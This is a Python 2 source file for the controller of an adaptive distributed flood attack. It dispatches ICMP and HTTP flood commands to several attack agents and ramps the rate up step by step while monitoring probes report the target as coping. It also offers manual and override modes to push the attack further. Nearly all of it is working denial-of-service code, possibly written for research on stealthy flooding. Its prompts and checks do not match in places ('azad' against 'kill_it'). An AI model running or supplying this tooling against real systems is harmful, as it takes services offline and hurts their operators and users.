import Queue, threading, random, time, socket, os, struct

class Attacks(threading.Thread):
    def __init__(self, attack_q, input_q, probe_1, probe_2, rate_q, application_mon_q, flag_q, http_treshold_q_rep):
        threading.Thread.__init__(self) # Required for thread class
        self.attack_Q = attack_q
        self.input_Q = input_q
        self.last_command = None
        self.probe_out = probe_1
        self.probe_in = probe_2
        self.mon_rate_q = rate_q
        self.mon_recv_q = Queue.Queue()
        self.application_mon_q = application_mon_q
        self.flag_q = flag_q
        self.http_treshold_q_rep = http_treshold_q_rep

    def perform_attack(self, attack, target, port, rate, status, duration=1000, size=100): # Traffic flood
        self.attack = attack
        self.rate = rate
        self.target = target
        self.port = port
        self.status = status   # "OK", if status eq "STOP", the attacker should abort right away
        self.duration = duration
        self.id = random.randint(1, 99999)
        self.pktsize = size
        self.command = {'id': self.id}
        self.command[self.id] = {'attack': self.attack, 'rate': self.rate, 'target': self.target,
                                 'duration': self.duration, 'port': self.port, 'status': self.status, 'pktsize': self.pktsize}

        try:
            self.attack_Q.put(self.command, False)
        except Queue.Full: # Only a single command on the Queue at all times.
            bogus = self.attack_Q.get(False)
            self.attack_Q.put(self.command, False)

    def perform_application_attack(self, attack, target, port, rate, status, get, processes, connections): # Application 'flood'
        self.attack = attack
        self.rate = rate
        self.target = target
        self.port = port
        self.status = status   # "OK", if status eq "STOP", the attacker should abort right away
        self.get = get
        self.connections = connections
        self.id = random.randint(1, 99999)
        self.processes = processes
        self.command = {'id': self.id}
        self.command[self.id] = {'attack': self.attack, 'rate': self.rate, 'target': self.target,
                                 'processes': self.processes, 'port': self.port, 'status': self.status, 'get': self.get, 'connections': self.connections}

        try:
            self.attack_Q.put(self.command, False)
        except Queue.Full: # Only a single command on the Queue at all times.
            bogus = self.attack_Q.get(False)
            self.attack_Q.put(self.command, False)

    def application_flood_handler(self, cmd):
        print "Started app flood handler"
        command = cmd
        aid = command['id']

        self.init_mon_rate = command[aid]['monrate']
        self.mon_rate = self.init_mon_rate
        self.attack_rate = command[aid]['startrate'] # Normally 0
        self.global_rate = self.mon_rate
        self.increase = 1
        self.flag = "do_not_ignore"

        self.perform_application_attack(command[aid]['attack'], command[aid]['target'], command[aid]['port'], self.attack_rate, command[aid]['status'], command[aid]['get'], command[aid]['processes'], command[aid]['connections'])

        while True:
            time.sleep(2)
            # IF FLAG IS NOT SET, REQUEST THE STATUS. OTHERWISE: JUST PROCEED...
            if self.flag != "ignore":
                try:
                    status = self.http_treshold_q_rep.get(True)
                    mon_val = float(status[1])*1000.0
                except:
                    pass
            else:
                status = ["GOOD", str(1)]
                try:
                    status2 = self.http_treshold_q_rep.get(True)
                    mon_val = float(status[1])*1000.0
                except:
                    pass

            if status[0] == "GOOD":
                self.attack_rate += self.increase
                self.perform_application_attack(command[aid]['attack'], command[aid]['target'], command[aid]['port'], self.attack_rate, command[aid]['status'], command[aid]['get'], command[aid]['processes'], command[aid]['connections'])
                print "Increased rate to: ", str(self.attack_rate), "  Rate per attack-agent: ", str(self.attack_rate / command[aid]['processes'])
            elif status[0] == "BAD":
                print "Dropping the rate by 1 increment and wait for input. \n"
                self.attack_rate -= self.increase
                self.perform_application_attack(command[aid]['attack'], command[aid]['target'], command[aid]['port'], self.attack_rate, command[aid]['status'], command[aid]['get'], command[aid]['processes'], command[aid]['connections'])

                print "Options: 'azad' (Go on with the attack) - 'decrease' (Decrease by one increment and try again) "

                flag_raw = self.flag_q.get(True) # Blocking
                if flag_raw == 'decrease':
                    self.attack_rate -= self.increase
                    self.perform_application_attack(command[aid]['attack'], command[aid]['target'], command[aid]['port'], self.attack_rate, command[aid]['status'], command[aid]['get'], command[aid]['processes'], command[aid]['connections'])
                elif flag_raw == 'kill_it':
                    print "Going on with the attack..."
                    self.flag = "ignore"


            # Write statistics to file for graphing
            GRAPH = 1
            if GRAPH == 1:
                try:
                    global_rate_file = open('/tmp/global.csv', 'a')
                    msgbuffer = (str(int(self.attack_rate)) + "," + str(mon_val) + "\n")
                    global_rate_file.write(msgbuffer)
                    global_rate_file.close()
                except:
                    pass

    def traffic_flood_handler(self, cmd):
        command = cmd
        aid = command['id']

        self.global_rate = command[aid]['startrate']
        self.attack_rate = self.global_rate * (0.95)
        self.increase = 400 # Rate increments
        self.init_mon_rate =  self.global_rate * (0.05) - (8 * self.increase)
        self.mon_rate = self.init_mon_rate
        self.no_agents = 3.0 # Number of agents. Hardcoded for now.

        print "Init initial attack rate..."
        self.perform_attack(command[aid]['attack'], command[aid]['target'],command[aid]['port'],(self.attack_rate/self.no_agents),command[aid]['status'], command[aid]['pktsize'])

        message = {"target": command[aid]['target'], "pktsize":command[aid]['pktsize'], "monrate":command[aid]['monrate']}
        self.mon_rate_q.put(message)
        request = {'command': "number_received"}
        time.sleep(1)  # Wait for packets to be generated + RTT to receiver

        J = 0
        K = 0
        flag = None
        last_extrarate = 0
        while True:

            self.probe_out.put(request)
            status = self.probe_in.get(True) # Blocks till answer is recv
            #print "K","Recv ", "Tolerated recv", "Expected rate", "Global rate"
            #print K, status, (self.mon_rate - (self.mon_rate*0.1)), self.mon_rate, self.global_rate, "\n"
            if K < 30:
                status = self.mon_rate
                K += 1
            #print (float(1) - ((float(self.mon_rate) - float(status))/(float(self.attack_rate) + float(self.mon_rate))))
            if (((float(1) - ((float(self.mon_rate) - float(status))/(float(self.attack_rate) + float(self.mon_rate)))) > float(0.99)) and flag != 'manual') or (flag == 'kill_it'): # Check threshold or flag override
                # if not flag:
                #     print "  Attack falls within margins. Increasing rate by # ", str(self.increase)
                # else:
                #     print "  Increasing the attack rate even further: ", str(self.increase)
                print "Normal: True"

                if self.mon_rate >= (self.init_mon_rate + ((self.increase) * 8)): # Handoff attack every 10 steps

                    self.global_rate += self.increase           #AZAD self.global_rate = self.attack_rate + self.init_mon_rate
                    self.attack_rate =  0.95 * self.global_rate #AZAD += (self.mon_rate - self.init_mon_rate)
                    print "  Handing off attack to attack agents by # ", str(self.mon_rate - self.init_mon_rate), " Total rate: ", str(self.global_rate)
                    self.perform_attack(command[aid]['attack'], command[aid]['target'],command[aid]['port'],(self.attack_rate/self.no_agents),command[aid]['status'], command[aid]['pktsize'])
                    self.init_mon_rate = (0.05 * self.global_rate) - (8 * self.increase) #AZAD
                    self.mon_rate = self.init_mon_rate

                else:
                    if J >= 1: # was 2
                        self.mon_rate += self.increase
                        J = 0

                message = {"target": command[aid]['target'], "pktsize":command[aid]['pktsize'], "monrate":self.mon_rate}
                self.mon_rate_q.put(message) # Update monflood_send with new rate

            elif flag == 'manual':
                print "Manual control over attack"
                FC = open('command.conf', 'r')
                extrarate = FC.readline() #rounded rates
                FC.close()
                if extrarate:
                    print extrarate
                    extrarate = int(float(extrarate))
                    self.global_rate += extrarate
                    self.attack_rate =  0.95 * self.global_rate
                    self.perform_attack(command[aid]['attack'], command[aid]['target'],command[aid]['port'],(self.attack_rate/self.no_agents),command[aid]['status'], command[aid]['pktsize'])
                    print "  New (manual) attack rate: ", str(self.attack_rate)
                    message = {"target": command[aid]['target'], "pktsize":command[aid]['pktsize'], "monrate":self.mon_rate}
                    self.mon_rate_q.put(message) # Update monflood_send with new rate
                    last_extrarate = extrarate
            else:
                #print "Stopping attack. Or should we reset attack_rate to attack_rate - *2000* and start again. 'Sustained attack' "
                print "Halting attack. Proceed (Option: azad), decrease (option: decrease) or manual control (option: manual)?"
                flag = self.flag_q.get(True)
                if flag == 'decrease':
                    self.attack_rate = self.attack_rate - self.mon_rate
                    self.mon_rate = self.init_mon_rate
                    self.global_rate = self.attack_rate + self.mon_rate
                if flag == 'manual':
                    # take manual control over the attack from F:command.conf
                    print "Taking manual control of the attack..."
                elif flag == 'kill_it':
                    print "Going on with the attack..."

            # Write statistics to file for graphing
            GRAPH = 1
            if GRAPH == 1:
                try:
                    global_rate_file = open('/tmp/global.csv', 'a')
                    msgbuffer = (str(self.global_rate) + "," + str(int(self.attack_rate)) + "," + str(int(self.mon_rate)) + "," + str(int(status)) + "\n")
                    global_rate_file.write(msgbuffer)
                    global_rate_file.close()
                except:
                    pass

            J += 1
            time.sleep(2) # 2 second between 'probes'

    # 'Main'
    def run(self):
        traffic_floods = ['ICMPFLOOD']      # Bandwidth attacks (Array)
        application_floods = ['HTTPFLOOD']  # Application level attacks (Array)

        # Reset graph file before starting
        GRAPH = 1
        if GRAPH == 1:
            try:
                global_rate_file = open('/var/www/html/RGraph/RP2/global.csv', 'w')
                global_rate_file.write("0,0,0,0\n")
                global_rate_file.close()
            except:
                pass

        while 1:
            try:
                self.new_command = self.input_Q.get(True, 0.05)
                #print self.new_command
            except Queue.Empty:
                self.new_command = None

            if self.new_command:
                aid = self.new_command['id']


                if self.new_command[aid]['attack'] in traffic_floods:
                    self.traffic_flood_handler(self.new_command)


                elif self.new_command[aid]['attack'] in application_floods:
                    self.application_flood_handler(self.new_command)

